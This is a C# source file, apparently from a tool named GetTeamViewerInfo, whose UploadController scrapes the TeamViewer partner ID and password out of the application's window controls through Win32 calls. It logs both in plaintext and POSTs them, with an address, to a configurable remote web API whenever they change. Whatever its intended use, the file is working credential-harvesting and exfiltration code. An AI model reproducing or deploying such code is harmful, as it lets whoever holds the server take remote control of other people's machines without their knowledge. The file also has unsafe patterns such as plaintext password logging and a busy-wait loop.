using GetTeamViewerInfo.Commands;
using GetTeamViewerInfo.Model;
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace GetTeamViewerInfo.Controller
{
    public class UploadController
    {
        private static TeamViewerInfo tvi;
        private CookieContainer cookies = new CookieContainer();

        public UploadController()
        {
            //_autoUploadTimer = new System.Threading.Timer(UploadTimer, null, 1000, 10000);
            ThreadPool.QueueUserWorkItem(UploadTimer, "one");
            TeamViewerInfo.IdChange += IdOrPwdChange;
            TeamViewerInfo.PwdChange += IdOrPwdChange;
        }

        private static void UploadTimer(object o)
        {
            try
            {
                while (true)
                {
                    if (MainConfig.Config == null)
                        continue;
                    if (MainConfig.Config.UploadEnable)
                    {
                        IntPtr mainHandler = FindWindow(null, "TeamViewer");
                        IntPtr xHandler = FindWindowEx(mainHandler, IntPtr.Zero, "#32770", null);
                        IntPtr preHandler = FindWindowEx(xHandler, IntPtr.Zero, null, "伙伴ID");
                        IntPtr idHandler = FindWindowEx(xHandler, preHandler, null, null);
                        IntPtr pwdHandler = FindWindowEx(xHandler, idHandler, null, null);
                        StringBuilder id = new StringBuilder();
                        StringBuilder pwd = new StringBuilder();
                        SendMessage(idHandler, 0x000D, 20, id);
                        SendMessage(pwdHandler, 0x000D, 20, pwd);
                        if (tvi == null)
                        {
                            tvi = new TeamViewerInfo() {};
                            tvi.id = id.ToString();
                            tvi.pwd = pwd.ToString();
                            LogController.Info(string.Format("New TeamViewerInfo.id={0}&pwd={1}", id, pwd));
                            continue;
                        }
                        if (tvi.id != id.ToString() || tvi.pwd != pwd.ToString())
                        {
                            tvi.id = id.ToString();
                            tvi.pwd = pwd.ToString();
                            LogController.Info(string.Format("New TeamViewerInfo.id={0}&pwd={1}", id, pwd));
                        }
                    }
                }
            }catch(Exception e)
            {
                LogController.Error(e);
                UploadTimer(o);
            }
        }

        private void IdOrPwdChange(object sender,EventArgs e)
        {
            if (tvi == null || tvi.id == null || tvi.pwd == null)
                return;
            using (CookieWebClient _webClient = new CookieWebClient(cookies))
            {
                string _getPostString = string.Format("id={0}&pwd={1}&addr={2}", tvi.id, tvi.pwd, MainConfig.Config.Addr);
                byte[] requestData = _webClient.UploadData(MainConfig.Config.WebApiUri, "POST", Encoding.UTF8.GetBytes(_getPostString));
                var responseText = Encoding.UTF8.GetString(requestData);
                if (responseText.IndexOf("\"code\":1") > 0)
                    LogController.Info("Upload OK...");
            }
        }

        [DllImport("user32.dll", EntryPoint = "SendMessage")]
        public static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, StringBuilder lParam);

        [DllImport("user32.dll", EntryPoint = "FindWindow")]
        private extern static IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "FindWindowEx")]
        private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
    }
}
